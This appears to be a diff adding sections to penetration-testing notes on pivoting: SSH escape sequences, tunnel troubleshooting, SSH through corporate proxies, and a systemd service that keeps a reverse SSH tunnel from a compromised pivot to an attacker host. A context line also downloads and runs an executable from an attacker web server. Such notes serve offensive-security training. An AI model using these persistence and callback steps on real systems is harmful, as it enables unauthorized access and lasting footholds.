@@ -218,3 +218,177 @@ python3 -m http.server 8123
 Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 C:\backupscript.exe
 ```
+
+## SSH Escape Sequences
+
+SSH has built-in escape sequences for managing connections mid-session without disconnecting. The escape character defaults to `~` (tilde) and must follow a newline.
+
+```
+# Available escape sequences (press Enter, then type the sequence):
+~C    — open SSH command-line interface (for adding port forwards live)
+~.    — terminate the connection immediately
+~#    — list all forwarded connections on current session
+~?    — show escape help menu
+~Z    — suspend SSH session (SIGTSTP)
+~~    — send literal tilde character
+
+# Example: add a local forward to an existing SSH session mid-flight
+# Press Enter, type ~C — SSH command prompt opens:
+ssh> -L 8443:172.16.5.19:443
+# Forwarding port.
+
+# Example: list active forwards on the session
+# Press Enter, type ~#
+# Output shows all open forwarded connections
+
+# Tip: if ~ doesn't trigger, confirm the EscapeChar setting:
+grep EscapeChar ~/.ssh/config
+# Default is ~; set to 'none' to disable (useful in scripts)
+
+# The ~. escape is useful when a tunnel hangs and Ctrl+C doesn't work:
+# Press Enter, then ~.  — immediately kills the SSH connection
+```
+
+## Troubleshooting Common SSH Tunnel Issues
+
+```
+# Issue: AllowTcpForwarding disabled in sshd_config on pivot
+# Symptom: "channel 2: open failed: administratively prohibited"
+# Check:
+ssh -v -L 8080:172.16.5.100:80 ubuntu@10.129.202.64
+# Look for: "open failed: administratively prohibited"
+
+# Fix options:
+# 1. If you have root on pivot, enable forwarding:
+echo "AllowTcpForwarding yes" >> /etc/ssh/sshd_config
+systemctl reload sshd
+
+# 2. If you can't change sshd_config, bypass with socat or netcat relay:
+socat TCP-LISTEN:8080,fork TCP:172.16.5.100:80 &
+
+# 3. Use Chisel over HTTP instead — not affected by SSH restrictions
+
+# Issue: GatewayPorts needed for -R to bind on 0.0.0.0
+# By default SSH -R binds only to loopback (127.0.0.1) on the remote side
+# To bind on all interfaces, add GatewayPorts yes to sshd_config:
+# GatewayPorts yes  — allows -R to bind on 0.0.0.0
+# Or use explicit notation:
+ssh -R 0.0.0.0:8080:172.16.5.19:3389 ubuntu@10.129.202.64
+
+# Issue: tunnel works but drops frequently
+# Fix: enable keepalives in ~/.ssh/config or on command line:
+ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
+    -L 3389:172.16.5.19:3389 ubuntu@10.129.202.64
+
+# Issue: "Bind: Address already in use"
+# Another process is already listening on the local port
+ss -tlnp | grep 3389
+kill $(lsof -t -i:3389)
+
+# Issue: "Connection refused" when using the tunnel
+# The target host/port is not reachable from the pivot — verify:
+# From pivot:
+nc -zv 172.16.5.19 3389
+```
+
+## SSH over HTTP/HTTPS Proxy (Corporate Proxy Traversal)
+
+When the pivot is only reachable through a corporate HTTP proxy, use `ProxyCommand` with `ncat` or `corkscrew` to tunnel the SSH connection through HTTP CONNECT.
+
+```
+# Method 1: ncat (from nmap package) — HTTP CONNECT proxy
+ssh -o "ProxyCommand ncat --proxy proxy.corp.com:8080 --proxy-type http %h %p" \
+    ubuntu@10.129.202.64
+
+# Method 2: corkscrew — classic HTTP CONNECT proxy wrapper
+sudo apt install corkscrew
+ssh -o "ProxyCommand corkscrew proxy.corp.com 8080 %h %p" ubuntu@10.129.202.64
+
+# Method 3: nc with -X and -x options (macOS / BSD nc)
+ssh -o "ProxyCommand nc -X connect -x proxy.corp.com:8080 %h %p" ubuntu@10.129.202.64
+
+# Method 4: proxy with authentication (corkscrew supports ~/.ssh/proxy-auth)
+# Create ~/.ssh/proxy-auth:
+# username:password
+chmod 600 ~/.ssh/proxy-auth
+ssh -o "ProxyCommand corkscrew proxy.corp.com 8080 %h %p ~/.ssh/proxy-auth" ubuntu@10.129.202.64
+
+# In ~/.ssh/config for persistent proxy routing:
+Host pivot-through-proxy
+    HostName 10.129.202.64
+    User ubuntu
+    ProxyCommand ncat --proxy proxy.corp.com:8080 --proxy-type http %h %p
+    DynamicForward 9050
+
+# NTLM proxy authentication (use ntlmaps or px to bridge):
+# ntlmaps — Python proxy that converts NTLM auth to basic:
+pip3 install ntlmaps
+# Run ntlmaps locally on port 3128, point SSH ProxyCommand at localhost:3128
+```
+
+## Persistent Reverse SSH Tunnel with systemd
+
+When you need a persistent reverse tunnel from a pivot host back to your attack box — surviving reboots and connection drops — install it as a systemd service on the pivot.
+
+```
+# ── On the pivot host ─────────────────────────────────────────
+
+# Step 1: Create a dedicated SSH key pair for the tunnel (no passphrase):
+ssh-keygen -t ed25519 -f /etc/ssh/tunnel_key -N ""
+# Copy public key to attack box authorized_keys:
+cat /etc/ssh/tunnel_key.pub
+# On attack box: echo "PUBKEY" >> ~/.ssh/authorized_keys
+
+# Step 2: Create the systemd service file:
+cat > /etc/systemd/system/ssh-reverse-tunnel.service << 'EOF'
+[Unit]
+Description=SSH Reverse Tunnel
+After=network.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+ExecStart=/usr/bin/ssh \
+    -i /etc/ssh/tunnel_key \
+    -N \
+    -R 0.0.0.0:4444:localhost:22 \
+    -o ServerAliveInterval=30 \
+    -o ServerAliveCountMax=3 \
+    -o StrictHostKeyChecking=no \
+    -o ExitOnForwardFailure=yes \
+    attacker@10.10.14.5
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Step 3: Enable and start the service:
+systemctl daemon-reload
+systemctl enable ssh-reverse-tunnel
+systemctl start ssh-reverse-tunnel
+
+# Step 4: Verify the tunnel is active:
+systemctl status ssh-reverse-tunnel
+# On attack box: ss -tlnp | grep 4444
+
+# Step 5: From attack box — SSH back through the reverse tunnel:
+ssh -p 4444 ubuntu@localhost
+
+# Clean up: disable and remove
+systemctl stop ssh-reverse-tunnel
+systemctl disable ssh-reverse-tunnel
+rm /etc/systemd/system/ssh-reverse-tunnel.service
+systemctl daemon-reload
+```
+
+## Resources
+
+- OpenSSH manual — `man ssh`, `man ssh_config`, `man sshd_config`
+- corkscrew — https://github.com/bryanpkc/corkscrew
+- autossh — https://www.harding.motd.ca/autossh/
+- ProxyJump documentation — https://www.openssh.com/txt/release-7.3
+- MITRE T1572 — Protocol Tunneling
+- MITRE T1090 — Proxy
